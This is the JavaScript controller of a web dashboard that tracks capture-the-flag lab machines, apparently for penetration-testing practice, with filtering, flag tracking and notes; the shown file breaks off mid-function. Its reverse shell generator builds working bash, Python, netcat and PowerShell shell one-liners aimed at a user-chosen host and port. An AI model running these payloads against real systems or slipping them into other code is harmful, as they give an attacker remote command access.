/**
 * ZEROBOX // TACTICAL CYBER OPERATIONS SUITE
 * HIGH-PERFORMANCE VANILLA CONTROLLER & DATA ENGINE (app.js)
 * Zero-dependency, offline-first client-side architecture.
 * Standards: ES6+, Sub-2ms in-memory filtering, full localStorage persistence.
 */

(function () {
  'use strict';

  // --------------------------------------------------------------------------
  // 1. DATA REPOSITORY: REALISTIC SAMPLE TARGETS
  // --------------------------------------------------------------------------
  const TARGET_CATALOG = [
    {
      id: 'htb-forest',
      name: 'FOREST',
      ip: '10.10.10.161',
      os: 'Windows',
      platform: 'HTB',
      difficulty: 'Easy',
      status: 'active',
      archetype: 'Active Directory Domain Controller',
      archetypeCategory: 'ad',
      attackVectors: ['Kerberoasting', 'BloodHound', 'AS-REP', 'SeBackupPrivilege', 'Exchange RBAC'],
      certs: ['OSCP', 'CPTS'],
      description: 'Windows Server 2016 Domain Controller vulnerable to AS-REP Roasting on service accounts, BloodHound ACL path discovery to Exchange Windows Permissions group, and privilege escalation via SeBackupPrivilege.'
    },
    {
      id: 'thm-rootme',
      name: 'ROOTME',
      ip: '10.10.10.14',
      os: 'Linux',
      platform: 'THM',
      difficulty: 'Easy',
      status: 'completed',
      archetype: 'Hardened Linux Bastion',
      archetypeCategory: 'web',
      attackVectors: ['File-Upload', 'Bypass', 'SUID-Python', 'Privesc'],
      certs: ['OSCP'],
      description: 'Ubuntu Linux server running Apache with file upload validation bypass on /panel (.phtml), reverse shell catch, and root privilege escalation via SUID binary /usr/bin/python.'
    },
    {
      id: 'htb-buff',
      name: 'BUFF',
      ip: '10.10.10.198',
      os: 'Windows',
      platform: 'HTB',
      difficulty: 'Hard',
      status: 'retired',
      archetype: 'Memory Corruption & Exploit Dev',
      archetypeCategory: 'binary',
      attackVectors: ['Gym-Mgmt RCE', 'CloudMe BOF', 'Chisel Port-Fwd', 'Buffer-Overflow'],
      certs: ['OSCP', 'CPTS'],
      description: 'Gym Management System 1.0 unauthenticated file upload leading to web shell, followed by local privilege escalation via CloudMe 1.11.2 buffer overflow forwarded through Chisel reverse tunnel.'
    },
    {
      id: 'htb-metatwo',
      name: 'METATWO',
      ip: '10.10.11.186',
      os: 'Linux',
      platform: 'HTB',
      difficulty: 'Insane',
      status: 'retired',
      archetype: 'Multi-Tier Cloud & Pod Cluster',
      archetypeCategory: 'cloud',
      attackVectors: ['SSRF', 'AWS IAM Metadata', 'Pod Escape', 'Docker Socket', 'K8s RBAC'],
      certs: ['CWEE', 'CPTS'],
      description: 'Enterprise microservice cluster exploiting server-side request forgery (SSRF) against internal metadata endpoint, IAM credential theft, container breakout via writable Docker socket, and cluster takeover.'
    }
  ];

  // --------------------------------------------------------------------------
  // 2. STATE STORE & PERSISTENCE ENGINE
  // --------------------------------------------------------------------------
  const STATE = {
    theme: localStorage.getItem('zb_theme') || 'neon',
    mode: localStorage.getItem('zb_mode') || 'dark',
    filterQuery: '',
    filterOs: 'all',
    filterPlatform: 'all',
    filterArchetype: 'all',
    filterPathway: 'all',
    sortBy: 'difficulty',
    activeTargetId: null,
    activeTargetTimer: null,
    activeTargetStartTime: null,
    selectedTargetId: null,
    focusedCardIndex: -1,
    flags: JSON.parse(localStorage.getItem('zb_flags') || '{}'),
    notes: JSON.parse(localStorage.getItem('zb_notes') || '{}'),
    lhost: localStorage.getItem('zb_lhost') || '10.10.14.2',
    lport: localStorage.getItem('zb_lport') || '4444',
    activePayloadType: 'bash'
  };

  function saveFlags() {
    localStorage.setItem('zb_flags', JSON.stringify(STATE.flags));
  }

  function saveNotes() {
    localStorage.setItem('zb_notes', JSON.stringify(STATE.notes));
  }

  function saveActiveTargetSession() {
    if (STATE.activeTargetId) {
      localStorage.setItem('zb_active_target', JSON.stringify({
        id: STATE.activeTargetId,
        startTime: STATE.activeTargetStartTime
      }));
    } else {
      localStorage.removeItem('zb_active_target');
    }
  }

  function restoreActiveTargetSession() {
    try {
      const saved = localStorage.getItem('zb_active_target');
      if (saved) {
        const parsed = JSON.parse(saved);
        const target = TARGET_CATALOG.find(t => t.id === parsed.id);
        if (target) {
          engageTarget(target, parsed.startTime);
        }
      }
    } catch (e) {
      console.warn('Failed to restore active target session:', e);
    }
  }

  // --------------------------------------------------------------------------
  // 3. THEME & MODE ENGINE (WCAG AA 6-MODE ARCHITECTURE)
  // --------------------------------------------------------------------------
  function applyThemeAndMode(theme, mode) {
    STATE.theme = theme;
    STATE.mode = mode;
    document.documentElement.setAttribute('data-theme', theme);
    document.documentElement.setAttribute('data-mode', mode);
    localStorage.setItem('zb_theme', theme);
    localStorage.setItem('zb_mode', mode);

    // Update Theme Switcher Pills in Header
    document.querySelectorAll('.theme-pill-btn').forEach(btn => {
      const isTarget = btn.getAttribute('data-set-theme') === theme;
      btn.classList.toggle('active', isTarget);
      btn.setAttribute('aria-pressed', isTarget ? 'true' : 'false');
    });

    // Update Mode Toggle Button State (preserve illustrated switch markup)
    const modeBtn = document.getElementById('modeToggleBtn');
    if (modeBtn) {
      modeBtn.setAttribute('aria-checked', mode === 'light' ? 'true' : 'false');
      modeBtn.setAttribute('title', `Toggle Mode: currently ${mode.toUpperCase()} (Alt+D)`);
    }
  }

  // --------------------------------------------------------------------------
  // 4. SUB-2MS HIGH-SPEED FILTERING ENGINE
  // --------------------------------------------------------------------------
  const DIFFICULTY_WEIGHTS = { 'Easy': 1, 'Medium': 2, 'Hard': 3, 'Insane': 4 };

  function filterAndSortTargets() {
    const q = STATE.filterQuery.trim().toLowerCase();
    const osFilter = STATE.filterOs;
    const platformFilter = STATE.filterPlatform;
    const archetypeFilter = STATE.filterArchetype;
    const pathwayFilter = STATE.filterPathway;

    let filtered = TARGET_CATALOG.filter(target => {
      // 1. Text Query Filter
      if (q) {
        const matchesName = target.name.toLowerCase().includes(q);
        const matchesIp = target.ip.toLowerCase().includes(q);
        const matchesArchetype = target.archetype.toLowerCase().includes(q);
        const matchesVectors = target.attackVectors.some(v => v.toLowerCase().includes(q));
        const matchesCerts = target.certs.some(c => c.toLowerCase().includes(q));
        if (!matchesName && !matchesIp && !matchesArchetype && !matchesVectors && !matchesCerts) {
          return false;
        }
      }

      // 2. OS Filter
      if (osFilter !== 'all' && target.os.toLowerCase() !== osFilter.toLowerCase()) {
        return false;
      }

      // 3. Platform Filter
      if (platformFilter !== 'all' && target.platform.toLowerCase() !== platformFilter.toLowerCase()) {
        return false;
      }

      // 4. Archetype Domain Filter
      if (archetypeFilter !== 'all' && target.archetypeCategory !== archetypeFilter) {
        return false;
      }

      // 5. Pathway Filter
      if (pathwayFilter !== 'all') {
        if (!target.certs.map(c => c.toLowerCase()).includes(pathwayFilter.toLowerCase())) {
          return false;
        }
      }

      return true;
    });

    // Sorting Logic
    filtered.sort((a, b) => {
      if (STATE.sortBy === 'name') {
        return a.name.localeCompare(b.name);
      } else if (STATE.sortBy === 'difficulty') {
        return (DIFFICULTY_WEIGHTS[a.difficulty] || 0) - (DIFFICULTY_WEIGHTS[b.difficulty] || 0);
      } else if (STATE.sortBy === 'status') {
        const aPwned = (STATE.flags[a.id]?.user && STATE.flags[a.id]?.root) ? 1 : 0;
        const bPwned = (STATE.flags[b.id]?.user && STATE.flags[b.id]?.root) ? 1 : 0;
        return bPwned - aPwned;
      }
      return 0;
    });

    return filtered;
  }

  // --------------------------------------------------------------------------
  // 5. VECTOR ICONS (LINUX / WINDOWS SVGS)
  // --------------------------------------------------------------------------
  const OS_ICONS = {
    Windows: `<svg viewBox="0 0 24 24" fill="currentColor">
      <path d="M0 3.449L9.75 2.1v9.451H0m10.949-9.602L24 0v11.4H10.949M0 12.6h9.75v9.451L0 20.699M10.949 12.6H24V24l-12.9-1.801"/>
    </svg>`,
    Linux: `<svg viewBox="0 0 24 24" fill="currentColor">
      <path d="M12.001 2c-3.19 0-5.78 2.59-5.78 5.78 0 1.25.4 2.41 1.08 3.36-.67.65-1.52 1.63-2.02 2.76-.71 1.59-.68 3.29-.02 4.49.52.95 1.4 1.5 2.5 1.55.33.68.86 1.25 1.53 1.63.81.46 1.77.65 2.71.65.94 0 1.9-.19 2.71-.65.67-.38 1.2-.95 1.53-1.63 1.1-.05 1.98-.6 2.5-1.55.66-1.2.69-2.9-.02-4.49-.5-1.13-1.35-2.11-2.02-2.76.68-.95 1.08-2.11 1.08-3.36 0-3.19-2.59-5.78-5.78-5.78zm0 2c2.09 0 3.78 1.69 3.78 3.78 0 1.34-.7 2.52-1.76 3.2-.23.15-.38.4-.38.68 0 .2.08.39.22.53.58.56 1.32 1.38 1.75 2.37.5 1.13.43 2.19.04 2.89-.3.54-.83.82-1.55.82-.23 0-.44.09-.59.25-.15.16-.23.38-.21.61.07.72-.25 1.38-.8 1.7-.61.35-1.42.47-2.26.47s-1.65-.12-2.26-.47c-.55-.32-.87-.98-.8-1.7.02-.23-.06-.45-.21-.61-.15-.16-.36-.25-.59-.25-.72 0-1.25-.28-1.55-.82-.39-.7-.46-1.76.04-2.89.43-.99 1.17-1.81 1.75-2.37.14-.14.22-.33.22-.53 0-.28-.15-.53-.38-.68-1.06-.68-1.76-1.86-1.76-3.2 0-2.09 1.69-3.78 3.78-3.78z"/>
    </svg>`
  };

  // --------------------------------------------------------------------------
  // 6. TARGET CARD RENDER ENGINE
  // --------------------------------------------------------------------------
  function renderTargetCards() {
    const container = document.getElementById('targetGrid');
    if (!container) return;

    const targets = filterAndSortTargets();
    
    // Update target count badges
    const countActiveEl = document.getElementById('targetCountActive');
    const countTotalEl = document.getElementById('targetCountTotal');
    if (countActiveEl) countActiveEl.textContent = targets.length;
    if (countTotalEl) countTotalEl.textContent = TARGET_CATALOG.length;

    if (targets.length === 0) {
      container.innerHTML = `
        <div style="grid-column: 1 / -1; padding: 3rem; text-align: center; color: var(--text-muted); background: var(--bg-surface); border: 1px dashed var(--border); border-radius: var(--radius-md);">
          <div style="font-size: 1.1rem; font-weight: 700; color: var(--accent); margin-bottom: 0.5rem;">NO TARGETS MATCH SEARCH FILTERS</div>
          <p style="font-size: 0.8rem;">Try clearing your query or adjusting the platform/archetype scope.</p>
        </div>
      `;
      return;
    }

    const fragment = document.createDocumentFragment();

    targets.forEach((target, index) => {
      const card = document.createElement('article');
      card.className = 'target-card';
      card.setAttribute('tabindex', '0');
      card.setAttribute('data-target-id', target.id);
      card.setAttribute('data-index', index);

      if (index === STATE.focusedCardIndex) {
        card.classList.add('card-focused');
      }

      const flags = STATE.flags[target.id] || { user: false, root: false };
      const isEngaged = STATE.activeTargetId === target.id;
      const ledClass = isEngaged ? 'active' : (target.status === 'in-progress' ? 'in-progress' : '');

      // Attack vectors: render max 3 chips + overflow
      const maxChips = 3;
      const primaryVectors = target.attackVectors.slice(0, maxChips);
      const overflowVectors = target.attackVectors.slice(maxChips);

      let vectorChipsHtml = primaryVectors.map(v => `<span class="vector-chip">${v}</span>`).join('');
      if (overflowVectors.length > 0) {
        const popoverHtml = overflowVectors.map(v => `<span class="popover-item">&bull; ${v}</span>`).join('');
        vectorChipsHtml += `
          <div class="vector-overflow-chip" tabindex="0">
            +${overflowVectors.length} more
            <div class="vector-popover">${popoverHtml}</div>
          </div>
        `;
      }

      card.innerHTML = `
        <!-- 1. Card Header -->
        <div class="card-header-row">
          <div class="card-title-lockup">
            <div class="target-os-icon-box" title="${target.os}">
              ${OS_ICONS[target.os] || OS_ICONS.Linux}
            </div>
            <h2 class="target-name">${target.name}</h2>
          </div>
          <div class="target-meta-right">
            <button class="target-ip-pill" data-ip="${target.ip}" title="Click to copy IP">
              <span>${target.ip}</span>
              <svg viewBox="0 0 24 24" width="12" height="12" fill="none" stroke="currentColor" stroke-width="2">
                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"/>
                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
              </svg>
            </button>
            <div class="status-dot-led ${ledClass}" title="Status: ${isEngaged ? 'ENGAGED & ACTIVE' : target.status}"></div>
          </div>
        </div>

        <!-- 2. Difficulty & Flags Row -->
        <div class="card-subrow">
          <span class="difficulty-badge diff-${target.difficulty.toLowerCase()}">${target.difficulty}</span>
          <div class="flags-cluster">
            <label class="flag-toggle-label ${flags.user ? 'checked' : ''}" data-flag-target="${target.id}" data-flag-type="user">
              <input type="checkbox" class="flag-checkbox" ${flags.user ? 'checked' : ''} />
              <span>User</span>
            </label>
            <label class="flag-toggle-label ${flags.root ? 'checked' : ''}" data-flag-target="${target.id}" data-flag-type="root">
              <input type="checkbox" class="flag-checkbox" ${flags.root ? 'checked' : ''} />
              <span>Root</span>
            </label>
          </div>
        </div>

        <!-- 3. Archetype Frame -->
        <div class="archetype-frame" title="Infrastructure Archetype">
          <span class="archetype-label-prefix">ARCHETYPE:</span>
          <span class="archetype-text">${target.archetype}</span>
        </div>

        <!-- 4. Micro Attack Vectors -->
        <div class="vector-chips-container">
          ${vectorChipsHtml}
        </div>

        <!-- 5. Action Footer -->
        <div class="card-footer-actions">
          <button class="btn-engage ${isEngaged ? 'engaged' : ''}" data-engage-id="${target.id}">
            <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2">
              <polygon points="5 3 19 12 5 21 5 3"/>
            </svg>
            <span>${isEngaged ? 'ENGAGED' : 'ENGAGE TARGET'}</span>
          </button>
          <button class="btn-inspect" data-inspect-id="${target.id}">
            <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2">
              <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
              <circle cx="12" cy="12" r="3"/>
            </svg>
            <span>INSPECT</span>
          </button>
        </div>
      `;

      fragment.appendChild(card);
    });

    container.innerHTML = '';
    container.appendChild(fragment);
  }

  // --------------------------------------------------------------------------
  // 7. TOAST FEEDBACK & CLIPBOARD ENGINE
  // --------------------------------------------------------------------------
  let toastTimer = null;
  function showToast(message) {
    const toast = document.getElementById('clipboardToast');
    const toastText = document.getElementById('clipboardToastText');
    if (!toast || !toastText) return;

    toastText.textContent = message;
    toast.classList.add('show');

    if (toastTimer) clearTimeout(toastTimer);
    toastTimer = setTimeout(() => {
      toast.classList.remove('show');
    }, 2200);
  }

  function copyToClipboard(text, successMessage) {
    if (window.isSecureContext && navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(text).then(() => {
        showToast(successMessage || 'COPIED TO CLIPBOARD!');
      }).catch(err => {
        fallbackCopy(text, successMessage);
      });
    } else {
      fallbackCopy(text, successMessage);
    }
  }

  function fallbackCopy(text, successMessage) {
    const ta = document.createElement('textarea');
    ta.value = text;
    ta.style.position = 'fixed';
    ta.style.opacity = '0';
    document.body.appendChild(ta);
    ta.select();
    try {
      document.execCommand('copy');
      showToast(successMessage || 'COPIED TO CLIPBOARD!');
    } catch (e) {
      showToast('FAILED TO COPY');
    }
    document.body.removeChild(ta);
  }

  // --------------------------------------------------------------------------
  // 8. ACTIVE TARGET HUD SESSION CONTROLLER
  // --------------------------------------------------------------------------
  function engageTarget(target, preservedStartTime) {
    STATE.activeTargetId = target.id;
    STATE.activeTargetStartTime = preservedStartTime || Date.now();
    saveActiveTargetSession();

    const hudBanner = document.getElementById('activeTargetHud');
    const hudName = document.getElementById('hudTargetName');
    const hudIp = document.getElementById('hudIpPill');

    if (hudBanner) hudBanner.classList.add('is-active');
    if (hudName) hudName.textContent = target.name;
    if (hudIp) hudIp.textContent = target.ip;

    if (STATE.activeTargetTimer) {
      clearInterval(STATE.activeTargetTimer);
    }

    function updateClock() {
      const elapsedMs = Date.now() - STATE.activeTargetStartTime;
      const totalSec = Math.floor(elapsedMs / 1000);
      const hrs = String(Math.floor(totalSec / 3600)).padStart(2, '0');
      const mins = String(Math.floor((totalSec % 3600) / 60)).padStart(2, '0');
      const secs = String(totalSec % 60).padStart(2, '0');
      const timerEl = document.getElementById('hudTimer');
      if (timerEl) timerEl.textContent = `${hrs}:${mins}:${secs}`;
    }

    updateClock();
    STATE.activeTargetTimer = setInterval(updateClock, 1000);

    renderTargetCards();
    showToast(`ENGAGED TARGET // ${target.name}`);
  }

  function disengageTarget() {
    if (STATE.activeTargetTimer) {
      clearInterval(STATE.activeTargetTimer);
      STATE.activeTargetTimer = null;
    }
    const name = STATE.activeTargetId;
    STATE.activeTargetId = null;
    STATE.activeTargetStartTime = null;
    saveActiveTargetSession();

    const hudBanner = document.getElementById('activeTargetHud');
    if (hudBanner) hudBanner.classList.remove('is-active');

    renderTargetCards();
    showToast(`DISENGAGED TARGET SESSION`);
  }

  // --------------------------------------------------------------------------
  // 9. REVERSE SHELL GENERATOR & INSPECTION PANEL
  // --------------------------------------------------------------------------
  function getPayloadString(type, lhost, lport) {
    switch (type) {
      case 'bash':
        return `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`;
      case 'python':
        return `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${lhost}",${lport}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'`;
      case 'nc':
        return `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${lhost} ${lport} >/tmp/f`;
      case 'ps':
        return `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${lhost}",${lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
      default:
        return `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`;
    }
  }

  function updatePayloadDisplay() {
    const codeBox = document.getElementById('payloadCodeBox');
    if (!codeBox) return;
    const lhost = document.getElementById('shellLhost')?.value || STATE.lhost;
    const lport = document.getElementById('shellLport')?.value || STATE.lport;
    codeBox.textContent = getPayloadString(STATE.activePayloadType, lhost, lport);
  }

  function openInspector(targetId) {
    const target = TARGET_CATALOG.find(t => t.id === targetId);
    if (!target) return;

    STATE.selectedTargetId = target.id;

    const titleEl = document.getElementById('inspectTitle');
    const subtitleEl = document.getElementById('inspectSubtitle');
    const descEl = document.getElementById('inspectDescription');
    const scratchpad = document.getElementById('targetScratchpad');
    const panel = document.getElementById('inspectionPanel');

    if (titleEl) titleEl.textContent = `${target.name} [${target.os}]`;
    if (subtitleEl) subtitleEl.textContent = `${target.platform} // ${target.difficulty} // ${target.archetype}`;
    if (descEl) descEl.textContent = target.description;
    if (scratchpad) {
      scratchpad.value = STATE.notes[target.id] || '';
    }

    updatePayloadDisplay();

    if (panel) panel.classList.add('open');
  }

  function closeInspector() {
    const panel = document.getElementById('inspectionPanel');
    if (panel) panel.classList.remove('open');
  }

  // --------------------------------------------------------------------------
  // 10. MOBILE FILTER BOTTOM SHEET ENGINE
  // --------------------------------------------------------------------------
  function openMobileSheet() {
    const sheet = document.getElementById('mobileBottomSheet');
    const backdrop = document.getElementById('drawerBackdrop');
    if (sheet) sheet.classList.add('open');
    if (backdrop) backdrop.classList.add('active');
  }

  function closeMobileSheet() {
    const sheet = document.getElementById('mobileBottomSheet');
    const backdrop = document.getElementById('drawerBackdrop');
    if (sheet) sheet.classList.remove('open');
    if (backdrop) backdrop.classList.remove('active');
  }

  // --------------------------------------------------------------------------
  // 11. EVENT LISTENERS & DELEGATION
  // --------------------------------------------------------------------------
  function setupEventListeners() {
    // 1. Theme Pill Selector in Header
    document.querySelectorAll('.theme-pill-btn').forEach(btn => {
      btn.addEventListener('click', () => {
        const theme = btn.getAttribute('data-set-theme');
        applyThemeAndMode(theme, STATE.mode);
        showToast(`THEME: ${theme.toUpperCase()}`);
      });
    });

    // 2. Mode Toggle (Dark/Light)
    const modeBtn = document.getElementById('modeToggleBtn');
    if (modeBtn) {
      modeBtn.addEventListener('click', () => {
        const nextMode = STATE.mode === 'dark' ? 'light' : 'dark';
        applyThemeAndMode(STATE.theme, nextMode);
        showToast(`MODE: ${nextMode.toUpperCase()}`);
      });
    }

    // 3. Search Input & Clear
    const searchInput = document.getElementById('globalSearchInput');
    const searchClear = document.getElementById('searchClearBtn');

    if (searchInput) {
      searchInput.addEventListener('input', e => {
        STATE.filterQuery = e.target.value;
        if (searchClear) {
          searchClear.classList.toggle('visible', STATE.filterQuery.length > 0);
        }
        renderTargetCards();
      });
    }

    if (searchClear) {
      searchClear.addEventListener('click', () => {
        if (searchInput) {
          searchInput.value = '';
          searchInput.focus();
        }
        STATE.filterQuery = '';
        searchClear.classList.remove('visible');
        renderTargetCards();
      });
    }

    // 4. OS Filter Pills
    document.querySelectorAll('.os-pill-btn').forEach(btn => {
      btn.addEventListener('click', () => {
        document.querySelectorAll('.os-pill-btn').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        STATE.filterOs = btn.getAttribute('data-os');
        renderTargetCards();
      });
    });

    // 5. Sort Dropdown
    const sortSelect = document.getElementById('sortSelect');
    if (sortSelect) {
      sortSelect.addEventListener('change', e => {
        STATE.sortBy = e.target.value;
        renderTargetCards();
      });
    }

    // 6. Pathway Filter Items (Desktop & Mobile)
    document.querySelectorAll('.pathway-item').forEach(item => {
      item.addEventListener('click', () => {
        document.querySelectorAll('.pathway-item').forEach(i => i.classList.remove('active'));
        item.classList.add('active');
        STATE.filterPathway = item.getAttribute('data-pathway');
        renderTargetCards();
        closeMobileSheet();
      });
    });

    // 7. Platform Filter Chips (Desktop & Mobile)
    document.querySelectorAll('.filter-chip').forEach(chip => {
      chip.addEventListener('click', () => {
        const platform = chip.getAttribute('data-platform');
        document.querySelectorAll('.filter-chip').forEach(c => {
          if (c.getAttribute('data-platform') === platform) c.classList.add('active');
          else c.classList.remove('active');
        });
        STATE.filterPlatform = platform;
        renderTargetCards();
        closeMobileSheet();
      });
    });

    // 8. Domain Vector Matrix Items (Desktop & Mobile)
    document.querySelectorAll('.vector-matrix-item').forEach(item => {
      item.addEventListener('click', () => {
        const archetype = item.getAttribute('data-archetype');
        document.querySelectorAll('.vector-matrix-item').forEach(i => {
          if (i.getAttribute('data-archetype') === archetype) i.classList.add('active');
          else i.classList.remove('active');
        });
        STATE.filterArchetype = archetype;
        renderTargetCards();
        closeMobileSheet();
      });
    });

    // 9. Target Grid Delegated Clicks (IP Copy, Flags, Engage, Inspect)
    const targetGrid = document.getElementById('targetGrid');
    if (targetGrid) {
      targetGrid.addEventListener('click', e => {
        // A. IP Pill Copy
        const ipBtn = e.target.closest('.target-ip-pill');
        if (ipBtn) {
          e.stopPropagation();
          const ip = ipBtn.getAttribute('data-ip');
          copyToClipboard(ip, `COPIED IP: ${ip}`);
          ipBtn.classList.add('copied');
          setTimeout(() => ipBtn.classList.remove('copied'), 1500);
          return;
        }

        // B. Flag Checkbox Toggle
        const flagLabel = e.target.closest('.flag-toggle-label');
        if (flagLabel) {
          e.preventDefault();
          e.stopPropagation();
          const targetId = flagLabel.getAttribute('data-flag-target');
          const flagType = flagLabel.getAttribute('data-flag-type');
          if (!STATE.flags[targetId]) {
            STATE.flags[targetId] = { user: false, root: false };
          }
          STATE.flags[targetId][flagType] = !STATE.flags[targetId][flagType];
          saveFlags();
          renderTargetCards();
          showToast(`FLAG: ${flagType.toUpperCase()} ${STATE.flags[targetId][flagType] ? 'CAPTURED' : 'CLEARED'}`);
          return;
        }

        // C. Engage Button
        const engageBtn = e.target.closest('.btn-engage');
        if (engageBtn) {
          e.stopPropagation();
          const targetId = engageBtn.getAttribute('data-engage-id');
          const target = TARGET_CATALOG.find(t => t.id === targetId);
          if (target) {
            if (STATE.activeTargetId === targetId) {
              disengageTarget();
            } else {
              engageTarget(target);
            }
          }
          return;
        }

        // D. Inspect Button
        const inspectBtn = e.target.closest('.btn-inspect');
        if (inspectBtn) {
          e.stopPropagation();
          const targetId = inspectBtn.getAttribute('data-inspect-id');
          openInspector(targetId);
          return;
        }

        // E. Card Body Click -> Focus Card
        const card = e.target.closest('.target-card');
        if (card) {
          const index = parseInt(card.getAttribute('data-index'), 10);
          setFocusedCard(index);
        }
      });
    }

    // 10. Active Target HUD Disconnect & IP Copy
    const hudDisconnect = document.getElementById('hudDisconnectBtn');
    if (hudDisconnect) {
      hudDisconnect.addEventListener('click', disengageTarget);
    }

    const hudIp = document.getElementById('hudIpPill');
    if (hudIp) {
      hudIp.addEventListener('click', () => {
        copyToClipboard(hudIp.textContent, `COPIED ACTIVE IP: ${hudIp.textContent}`);
      });
    }

    // 11. Inspector Drawer Close & Scratchpad Save
    const inspectClose = document.getElementById('inspectCloseBtn');
    if (inspectClose) inspectClose.addEventListener('click', closeInspector);

    const scratchpad = document.getElementById('targetScratchpad');
    if (scratchpad) {
      scratchpad.addEventListener('input', e => {
        if (STATE.selectedTargetId) {
          STATE.notes[STATE.selectedTargetId] = e.target.value;
          saveNotes();
        }
      });
    }

    // 12. Reverse Shell Generator Inputs & Tabs
    const shellLhost = document.getElementById('shellLhost');
    const shellLport = document.getElementById('shellLport');
    if (shellLhost) {
      shellLhost.addEventListener('input', e => {
        STATE.lhost = e.target.value;
        localStorage.setItem('zb_lhost', STATE.lhost);
        updatePayloadDisplay();
      });
    }
    if (shellLport) {
      shellLport.addEventListener('input', e => {
        STATE.lport = e.target.value;
        localStorage.setItem('zb_lport', STATE.lport);
        updatePayloadDisplay();
      });
    }

    document.querySelectorAll('.payload-tab-btn').forEach(btn => {
      btn.addEventListener('click', () => {
        document.querySelectorAll('.payload-tab-btn').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        STATE.activePayloadType = btn.getAttribute('data-payload');
        updatePayloadDisplay();
      });
    });

    const payloadBox = document.getElementById('payloadCodeBox');
    if (payloadBox) {
      payloadBox.addEventListener('click', () => {
        copyToClipboard(payloadBox.textContent.trim(), 'COPIED REVERSE SHELL PAYLOAD!');
      });
    }

    // 13. Mobile Bottom Sheet Trigger & Backdrop
    const mobileTrigger = document.getElementById('mobileFilterTriggerBtn');
    if (mobileTrigger) mobileTrigger.addEventListener('click', openMobileSheet);

    const mobileSheetClose = document.getElementById('mobileSheetCloseBtn');
    if (mobileSheetClose) mobileSheetClose.addEventListener('click', closeMobileSheet);

    const backdrop = document.getElementById('drawerBackdrop');
    if (backdrop) {
      backdrop.addEventListener('click', () => {
        closeMobileSheet();
        closeInspector();
      });
    }

    // 14. Bottom Thumb-Dock Navigation Tabs
    document.querySelectorAll('.dock-item-btn').forEach(btn => {
      btn.addEventListener('click', () => {
        document.querySelectorAll('.dock-item-btn').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        const dockType = btn.getAttribute('data-dock');
        if (dockType === 'targets') {
          window.scrollTo({ top: 0, behavior: 'smooth' });
        } else {
          showToast(`NAV: ${dockType.toUpperCase()} VIEW`);
        }
      });
    });

    // 15. Keyboard Shortcuts Modal
    const kbdBtn = document.getElementById('hotkeyHelpBtn');
    const kbdModal = document.getElementById('keyboardModal');
    const kbdClose = document.getElementById('kbdModalCloseBtn');

    if (kbdBtn && kbdModal) {
      kbdBtn.addEventListener('click', () => kbdModal.classList.add('open'));
    }
    if (kbdClose && kbdModal) {
      kbdClose.addEventListener('click', () => kbdModal.classList.remove('open'));
    }
    if (kbdModal) {
      kbdModal.addEventListener('click', e => {
        if (e.target === kbdModal) kbdModal.classList.remove('open');
      });
    }
  }

  // --------------------------------------------------------------------------
  // 12. RED TEAM KEYBOARD SHORTCUTS CONTROLLER
  // --------------------------------------------------------------------------
  function setFocusedCard(index) {
    const cards = document.querySelectorAll('.target-card');
    if (cards.length === 0) return;

    if (index < 0) index = 0;
    if (index >= cards.length) index = cards.length - 1;

    STATE.focusedCardIndex = index;
    cards.forEach((c, idx) => {
      if (idx === index) {
        c.classList.add('card-focused');
        c.focus();
        if (typeof c.scrollIntoView === 'function') {
          c.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
        }
      } else {
        c.classList.remove('card-focused');
      }
    });
  }

  function setupKeyboardShortcuts() {
    window.addEventListener('keydown', e => {
      const activeEl = document.activeElement;
      const isInput = activeEl && (activeEl.tagName === 'INPUT' || activeEl.tagName === 'TEXTAREA');

      // 1. Escape: Close Modals & Drawers
      if (e.key === 'Escape') {
        const kbdModal = document.getElementById('keyboardModal');
        if (kbdModal && kbdModal.classList.contains('open')) {
          kbdModal.classList.remove('open');
          return;
        }
        closeInspector();
        closeMobileSheet();
        return;
      }

      // 2. Focus Search: / or Ctrl+K
      if ((e.key === '/' && !isInput) || ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 'k')) {
        e.preventDefault();
        const searchInput = document.getElementById('globalSearchInput');
        if (searchInput) {
          searchInput.focus();
          searchInput.select();
        }
        return;
      }

      // 3. Theme Presets: Alt + 1, Alt + 2, Alt + 3
      if (e.altKey && e.key === '1') {
        e.preventDefault();
        applyThemeAndMode('neon', STATE.mode);
        showToast('THEME: NEON HUD');
        return;
      }
      if (e.altKey && e.key === '2') {
        e.preventDefault();
        applyThemeAndMode('htb', STATE.mode);
        showToast('THEME: HTB EMERALD');
        return;
      }
      if (e.altKey && e.key === '3') {
        e.preventDefault();
        applyThemeAndMode('midnight-blue', STATE.mode);
        showToast('THEME: MIDNIGHT ICE');
        return;
      }

      // 4. Dark/Light Mode Toggle: Alt + D
      if (e.altKey && e.key.toLowerCase() === 'd') {
        e.preventDefault();
        const nextMode = STATE.mode === 'dark' ? 'light' : 'dark';
        applyThemeAndMode(STATE.theme, nextMode);
        showToast(`MODE: ${nextMode.toUpperCase()}`);
        return;
      }

      // 5. Shortcuts Sheet: ?
      if (e.key === '?' && !isInput) {
        e.preventDefault();
